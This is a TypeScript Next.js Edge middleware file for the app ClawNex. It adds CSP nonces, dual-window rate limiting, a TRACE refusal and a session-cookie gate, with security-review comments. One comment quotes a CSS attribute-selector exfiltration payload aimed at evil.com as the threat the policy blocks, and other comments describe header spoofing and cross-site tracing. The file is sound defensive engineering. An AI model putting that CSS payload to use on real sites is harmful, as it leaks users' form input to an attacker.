/**
 * ClawNex Edge Middleware — session gate for RBAC.
 *
 * Runs at the Edge Runtime (no Node.js native modules). Checks for the
 * PRESENCE of the clawnex_session cookie — actual token validation happens
 * per-route in the Node.js API handlers.
 *
 * When RBAC_ENABLED !== 'true', this middleware is a no-op.
 *
 * SECURITY NOTE: This middleware checks cookie PRESENCE only, not validity.
 * It is a UX optimization (redirect to /login), NOT a security boundary.
 * The actual security boundary is requireSession() called per-route in
 * each API handler. Every route MUST call requireSession() — the middleware
 * alone does NOT protect routes.
 *
 * @module middleware
 */

import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { RBAC_BUILD_ENABLED } from './lib/rbac/build-config';
import { PUBLIC_ORIGIN_BUILD } from './lib/auth/build-origin';

/**
 * Generate a fresh CSP nonce per request and attach it to both:
 *   - the request headers (so the page renderer can read it via next/headers)
 *   - the response Content-Security-Policy header
 *
 * Closes CRIT #3 (CSP unsafe-inline → nonce). Without a nonce, any XSS
 * injection executes inline `<script>` immediately. With nonce: the
 * browser only runs scripts whose `nonce={...}` attribute matches the
 * per-response CSP nonce, which the attacker can't predict.
 *
 * Next.js 14 honors a per-request nonce when read via `headers()` in a
 * server component — see src/app/layout.tsx.
 */
function buildCspWithNonce(nonce: string, isDev: boolean): string {
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'${isDev ? " 'unsafe-eval'" : ''} 'strict-dynamic'`,
    // H2 2026-05-14: drop `'unsafe-inline'` from style-src so an attacker
    // who lands HTML/CSS injection can't inject a `<style>` tag and pull
    // off the CSS-attribute-selector exfiltration class
    // (`input[value^="a"] { background: url(https://evil.com/leak?c=a); }`)
    // or pure-CSS UI redress. We split CSP3-style:
    //   - style-src-elem 'self'  → blocks attacker-injected <style> tags
    //     and disallows <link rel=stylesheet> to off-origin hosts. Tailwind
    //     emits a single extracted stylesheet under /_next/static/css/
    //     (loaded via same-origin <link>), so this is strict and safe.
    //   - style-src-attr 'unsafe-inline'  → keeps the React style={{...}}
    //     attribute pattern (~3169 callsites in src/) working. Attribute
    //     styles can ONLY land if an attacker already has HTML injection
    //     where React would escape attribute values — that's a separate
    //     XSS-class bug, not the `<style>` exfil vector H2 addresses.
    //   - style-src 'self' is the fallback for browsers without -elem/-attr
    //     support; same shape as -elem since the more dangerous case is the
    //     element-level <style> injection.
    //
    // M1 2026-05-15: DAST risk-accepted. style-src-attr 'unsafe-inline' is
    // the documented residual ([[AR-001]] in docs/qa/accepted-residuals.md).
    // Exploitation requires attacker-controlled content reaching a style
    // attribute value, which is itself an HTML/attribute-injection XSS —
    // close that class at the source, not by tightening this directive.
    // A CSS-variable migration of the inline style props would still need
    // 'unsafe-inline' here (custom-property assignments via
    // style={{ '--w': … }} also flow through style-src-attr).
    "style-src 'self'",
    "style-src-elem 'self'",
    "style-src-attr 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ');
}

function applySecurityHeaders(res: NextResponse, csp: string, _nonce: string): NextResponse {
  res.headers.set('Content-Security-Policy', csp);
  // Per internal reviewer P1-A 2026-05-14: do NOT emit `x-clawnex-nonce` as a response
  // header. Server components read the nonce from the matching REQUEST
  // header that middleware forwards via `request: { headers: reqHeaders }`.
  // The nonce isn't a secret (it's public on every <script nonce="...">
  // by spec) but echoing it back as a response header is unnecessary
  // attack surface for tooling-leak / confused-deputy scenarios.
  return res;
}

// Methods we route to handlers. TRACE is intentionally excluded — see
// the rejection block at the top of middleware().
const ALLOWED_METHODS = 'GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS';

type MiddlewareRateBucket = { hits: number[] };
// Dual-window rate limit. DAST 2026-05-15 Run 2 #H5 follow-up:
// the 60-second sustained-rate window alone allowed bursts of 15
// rapid requests to slip through at /api/* (limit 120/min). The
// 10-second burst window catches that pattern while leaving normal
// dashboard polling (panels typically poll every 3-5s per endpoint)
// well within both windows.
const BURST_WINDOW_MS = 10_000;
const SUSTAINED_WINDOW_MS = 60_000;
const middlewareRateBucketsBurst = new Map<string, MiddlewareRateBucket>();
const middlewareRateBucketsSustained = new Map<string, MiddlewareRateBucket>();

// Codex 2026-05-17 #5: do not trust X-Forwarded-For / X-Real-IP by default.
// They are client-controlled headers; an attacker rotating XFF values gets
// a fresh rate-limit bucket per request, defeating the burst+sustained
// limiter. Only honor them when ops explicitly opts in via TRUST_PROXY_HEADERS=1,
// which is set by deploy/install-prod.sh AFTER Caddy is configured with
// `header_up X-Forwarded-For {remote_host}` (overwrites any client-sent
// value with the real socket peer). Without that env, fall back to
// NextRequest.ip if the adapter populates it, else a shared 'unknown'
// bucket — better to over-limit than to grant per-spoof exemptions.
function clientIdentity(request: NextRequest): string {
  if (process.env.TRUST_PROXY_HEADERS === '1') {
    const forwarded = request.headers.get('x-forwarded-for');
    if (forwarded) return forwarded.split(',')[0]?.trim() || 'unknown';
    const realIp = request.headers.get('x-real-ip');
    if (realIp) return realIp;
  }
  const nextIp = (request as unknown as { ip?: string }).ip;
  return nextIp || 'unknown';
}

interface RateLimitPolicy {
  burst: number;       // max hits in BURST_WINDOW_MS (10s)
  sustained: number;   // max hits in SUSTAINED_WINDOW_MS (60s)
}

function rateLimitForPath(pathname: string): RateLimitPolicy | null {
  if (pathname.startsWith('/_next/') || pathname.startsWith('/fonts/')) return null;
  if (pathname === '/favicon.ico') return null;
  // Health uptime probes shouldn't burst — 5/10s + 10/min.
  if (pathname === '/api/health') return { burst: 5, sustained: 10 };
  // Chat is interactive but expensive — 5/10s + 10/min.
  if (pathname === '/api/chat') return { burst: 5, sustained: 10 };
  // Login: rate-limited at the route layer already (4 attempts trip),
  // but we want a coarse edge cap too. Per-IP-per-path = 8/10s, 30/min.
  if (pathname.startsWith('/api/auth/login')) return { burst: 8, sustained: 30 };
  // Generic /api/* — supports normal dashboard polling (a few req/sec
  // across many panels) while still rejecting unauthenticated bursts.
  // 10/10s catches the DAST 15-rapid-requests pattern; 120/min lets
  // sustained legitimate polling continue.
  if (pathname.startsWith('/api/')) return { burst: 10, sustained: 120 };
  // HTML pages — light traffic by nature.
  return { burst: 6, sustained: 12 };
}

interface BucketCheckResult {
  exceeded: boolean;
  retryAfter: number;
}

function checkBucket(
  bucketMap: Map<string, MiddlewareRateBucket>,
  key: string,
  windowMs: number,
  limit: number,
  now: number,
): BucketCheckResult {
  const cutoff = now - windowMs;
  const bucket = bucketMap.get(key) || { hits: [] };
  bucket.hits = bucket.hits.filter((ts) => ts > cutoff);
  if (bucket.hits.length >= limit) {
    bucketMap.set(key, bucket);
    return {
      exceeded: true,
      retryAfter: Math.max(1, Math.ceil((bucket.hits[0] + windowMs - now) / 1000)),
    };
  }
  return { exceeded: false, retryAfter: 0 };
}

function recordBucket(
  bucketMap: Map<string, MiddlewareRateBucket>,
  key: string,
  windowMs: number,
  now: number,
): void {
  const cutoff = now - windowMs;
  const bucket = bucketMap.get(key) || { hits: [] };
  bucket.hits = bucket.hits.filter((ts) => ts > cutoff);
  bucket.hits.push(now);
  bucketMap.set(key, bucket);
}

function checkMiddlewareRateLimit(request: NextRequest): { ok: true } | { ok: false; retryAfter: number } {
  if (request.method === 'OPTIONS') return { ok: true };
  const { pathname } = request.nextUrl;
  const policy = rateLimitForPath(pathname);
  if (!policy) return { ok: true };

  const now = Date.now();
  const key = `${clientIdentity(request)}:${pathname}`;

  const burst = checkBucket(middlewareRateBucketsBurst, key, BURST_WINDOW_MS, policy.burst, now);
  if (burst.exceeded) return { ok: false, retryAfter: burst.retryAfter };

  const sustained = checkBucket(middlewareRateBucketsSustained, key, SUSTAINED_WINDOW_MS, policy.sustained, now);
  if (sustained.exceeded) return { ok: false, retryAfter: sustained.retryAfter };

  recordBucket(middlewareRateBucketsBurst, key, BURST_WINDOW_MS, now);
  recordBucket(middlewareRateBucketsSustained, key, SUSTAINED_WINDOW_MS, now);

  // Opportunistic cleanup keeps both bucket maps bounded.
  if (middlewareRateBucketsBurst.size > 5000) {
    const cutoff = now - BURST_WINDOW_MS;
    for (const [bucketKey, value] of Array.from(middlewareRateBucketsBurst.entries())) {
      value.hits = value.hits.filter((ts) => ts > cutoff);
      if (value.hits.length === 0) middlewareRateBucketsBurst.delete(bucketKey);
    }
  }
  if (middlewareRateBucketsSustained.size > 5000) {
    const cutoff = now - SUSTAINED_WINDOW_MS;
    for (const [bucketKey, value] of Array.from(middlewareRateBucketsSustained.entries())) {
      value.hits = value.hits.filter((ts) => ts > cutoff);
      if (value.hits.length === 0) middlewareRateBucketsSustained.delete(bucketKey);
    }
  }

  return { ok: true };
}

function rateLimitResponse(csp: string, nonce: string, retryAfter: number): NextResponse {
  const res = NextResponse.json(
    { error: 'Too many requests' },
    {
      status: 429,
      headers: {
        'Retry-After': String(retryAfter),
        'Cache-Control': 'no-store',
      },
    },
  );
  return applySecurityHeaders(res, csp, nonce);
}

export function middleware(request: NextRequest) {
  // DAST 2026-05-15 #8: refuse TRACE globally before any other work.
  // TRACE echoes the inbound request (including cookies + auth
  // headers) back in the response body — historically abused for
  // cross-site credential reflection ("Cross-Site Tracing"). Modern
  // browsers ignore TRACE responses, but a server-side scanner or
  // an intermediary can still extract whatever the request carried.
  // We don't ship a TRACE handler anywhere; an explicit 405 with the
  // RFC-7231 Allow header makes the refusal unambiguous instead of
  // letting Next.js's default behavior decide.
  if (request.method === 'TRACE') {
    return new NextResponse(null, {
      status: 405,
      headers: { Allow: ALLOWED_METHODS },
    });
  }

  // Generate a per-request nonce. Used for CSP regardless of RBAC state.
  // 16 random bytes → 24-char base64 ≈ 128 bits of entropy. Build the
  // string with a for-loop instead of spread so it works without
  // downlevelIteration in the Edge Runtime tsconfig target.
  const nonceBytes = new Uint8Array(16);
  crypto.getRandomValues(nonceBytes);
  let nonceBin = '';
  for (let i = 0; i < nonceBytes.length; i++) {
    nonceBin += String.fromCharCode(nonceBytes[i]);
  }
  const nonce = btoa(nonceBin);
  const isDev = process.env.NODE_ENV === 'development';
  const csp = buildCspWithNonce(nonce, isDev);

  // Forward the nonce to downstream renderers via a request header. Server
  // components can read it via `headers().get('x-clawnex-nonce')`.
  const reqHeaders = new Headers(request.headers);
  reqHeaders.set('x-clawnex-nonce', nonce);
  reqHeaders.set('Content-Security-Policy', csp);

  const rate = checkMiddlewareRateLimit(request);
  if (rate.ok === false) {
    return rateLimitResponse(csp, nonce, rate.retryAfter);
  }

  // Only active when RBAC was enabled at build time.
  // Edge Runtime can't read .env.local at runtime, so we use a
  // build-time constant inlined by webpack.
  if (!RBAC_BUILD_ENABLED) {
    return applySecurityHeaders(
      NextResponse.next({ request: { headers: reqHeaders } }),
      csp,
      nonce,
    );
  }

  const { pathname } = request.nextUrl;

  // Allow-list: paths that don't require a session cookie
  const publicPaths = [
    '/login',
    '/setup',
    '/reset-password',
    '/api/auth/',
    '/api/v1/',
    '/api/health',
    '/api/proxy/ingest',
    '/_next/',
    '/fonts/',
    '/favicon.ico',
    '/clawnex-icon.png',
    '/clawnex-icon-light.png',
    // DAST 2026-05-15 #N1: well-known crawler / discovery files must
    // serve their actual text content from public/ instead of hitting
    // the auth gate (which returned the SPA login HTML — confusing
    // scanners and fingerprinting Next). RFC-9116 security.txt is a
    // documented security-contact channel; robots/sitemap are the
    // conventional crawler surfaces.
    '/robots.txt',
    '/sitemap.xml',
    '/.well-known/',
  ];

  const isPublic = publicPaths.some((p) => pathname.startsWith(p));
  if (isPublic) {
    return applySecurityHeaders(
      NextResponse.next({ request: { headers: reqHeaders } }),
      csp,
      nonce,
    );
  }

  // Check for session cookie PRESENCE (not validity)
  const sessionCookie = request.cookies.get('clawnex_session');
  if (!sessionCookie?.value) {
    // API requests get 401, page requests get redirected to login
    if (pathname.startsWith('/api/')) {
      return applySecurityHeaders(
        NextResponse.json(
          { error: 'Authentication required. Login at /login.' },
          { status: 401 },
        ),
        csp,
        nonce,
      );
    }

    // Use the baked public origin behind a reverse proxy so the redirect
    // Location header doesn't leak http://127.0.0.1:5001 to the browser.
    const loginUrl = new URL('/login', PUBLIC_ORIGIN_BUILD || request.url);
    loginUrl.searchParams.set('redirect', pathname);
    return applySecurityHeaders(NextResponse.redirect(loginUrl), csp, nonce);
  }

  return applySecurityHeaders(
    NextResponse.next({ request: { headers: reqHeaders } }),
    csp,
    nonce,
  );
}

export const config = {
  matcher: [
    /*
     * Match all routes except static files (images, fonts, etc.).
     * _next/static and _next/image are excluded here; additional static
     * paths are handled by the publicPaths allow-list above.
     */
    '/((?!_next/static|_next/image|favicon.ico|fonts|.*\\.png$|.*\\.svg$|.*\\.ico$).*)',
  ],
};
